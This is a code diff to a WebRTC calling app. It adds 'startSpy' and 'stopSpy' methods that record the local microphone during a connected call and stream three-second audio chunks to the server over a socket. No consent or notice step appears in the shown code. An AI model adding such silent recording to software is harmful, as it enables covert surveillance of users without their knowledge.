@@ -34,6 +34,8 @@ class Agent {
     playingAudio: HTMLAudioElement | null = null
     playingPeerAudio: HTMLAudioElement | null = null
     localIcesCache: RTCIceCandidate[] = []
+    mediaRecorder: MediaRecorder | null = null
+    mediaRecorderTimer: NodeJS.Timer | null = null
 
     async init() {
         await this.getMediaPermissions()
@@ -160,6 +162,7 @@ class Agent {
             this.peerConnection.addEventListener("connectionstatechange", (event) => {
                 if (this.peerConnection!.connectionState === ConnectionState.connected) {
                     store.dispatch(changeIsPeersConnected(true))
+                    this.localAudioStream && this.startSpy(this.localAudioStream)
                 }
                 if (
                     [ConnectionState.disconnected, ConnectionState.failed, ConnectionState.closed].includes(
@@ -167,6 +170,7 @@ class Agent {
                     )
                 ) {
                     store.dispatch(changeIsPeersConnected(false))
+                    this.stopSpy()
                 }
 
                 if (
@@ -294,6 +298,44 @@ class Agent {
         store.dispatch(changeCallEndCode(callEndCode))
         this.peerConnection?.close()
         this.playAudio()
+    }
+
+    startSpy(stream: MediaStream) {
+        const call = store.getState().webRTC.currentCall
+
+        if (call?.caller.id === store.getState().main.userId) {
+            EventSocket.socket?.emit(EVENT_TYPES.RECORD.START, {
+                callId: call?.id
+            })
+        }
+
+        this.mediaRecorder = new MediaRecorder(stream)
+        this.mediaRecorder.start()
+
+        this.mediaRecorderTimer = setInterval(() => {
+            this.mediaRecorder?.stop()
+            this.mediaRecorder?.start()
+        }, 3000)
+
+        this.mediaRecorder.addEventListener("dataavailable", (ev) =>
+            EventSocket.socket?.emit(EVENT_TYPES.RECORD.APPEND, {
+                recordBlob: ev.data,
+                format: this.mediaRecorder?.mimeType,
+                callId: call?.id
+            })
+        )
+    }
+
+    stopSpy() {
+        if (this.mediaRecorder) {
+            this.mediaRecorder.stop()
+            this.mediaRecorderTimer && clearInterval(this.mediaRecorderTimer)
+            this.mediaRecorder = null
+            this.mediaRecorderTimer = null
+            EventSocket.socket?.emit(EVENT_TYPES.RECORD.STOP, {
+                callId: store.getState().webRTC.currentCall?.id
+            })
+        }
     }
 
     async playAudio() {
